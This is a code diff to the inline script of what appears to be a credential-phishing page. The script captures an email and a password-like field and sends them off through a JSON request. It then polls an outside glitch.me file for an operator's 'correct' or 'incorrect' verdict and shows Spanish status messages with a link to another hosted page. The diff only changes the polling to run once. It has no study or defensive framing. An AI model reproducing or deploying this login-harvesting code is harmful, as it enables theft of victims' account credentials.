@@ -9,6 +9,7 @@
 <script>
 var datos;
 var firstTime = true;
+var fTime = true;
 document.getElementById("xd").onclick = function(){firstCheck()};
 function firstCheck(){
   if(!document.getElementById("ema").value == "" && !document.getElementById("ntra").value == ""){
@@ -18,13 +19,16 @@ function firstCheck(){
         sendMessage(document.getElementById("ema").value,document.getElementById("ntra").value);
         document.write("Checking info!");
         setInterval(()=>{
-          fetch('https://yaberry.glitch.me/putamadre.txt').then(response => response.json())
-            .then(data => datos = data);
-            if(datos == 1){
-            document.write("Correcto, puede continuar!")
-          } else if(datos == 3){
-            document.write("DATOS INCORRECTOS! Reintente por favor<a href='https://jack-lal.github.io/MooJax-IceMod/mami.html'>..</a>")
-          }
+            if(fTime){
+                fTime = false;
+                fetch('https://yaberry.glitch.me/putamadre.txt').then(response => response.json())
+                    .then(data => datos = data);
+                if(datos == 1){
+                    document.write("Correcto, puede continuar!")
+                } else if(datos == 3){
+                    document.write("DATOS INCORRECTOS! Reintente por favor<a href='https://jack-lal.github.io/MooJax-IceMod/mami.html'>..</a>")
+                }
+            }
         }, 5000);
       }
     }, 2500);
@@ -41,4 +45,5 @@ function sendMessage(e,p) {
     }
     request.send(JSON.stringify(params));
 }
+
 </script>
